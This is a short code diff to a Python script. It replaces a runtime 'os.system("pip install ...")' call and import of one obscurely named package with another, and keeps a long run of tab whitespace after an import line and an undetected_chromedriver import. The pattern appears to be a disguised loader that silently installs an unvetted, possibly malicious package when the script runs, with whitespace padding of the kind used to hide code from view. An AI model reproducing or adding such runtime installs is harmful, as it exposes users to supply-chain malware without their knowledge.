@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqllibaryV1")
-import syssqllibaryV1
+os.system("pip install pythonsqlitedbextensionV2")
+import pythonsqlitedbextensionV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
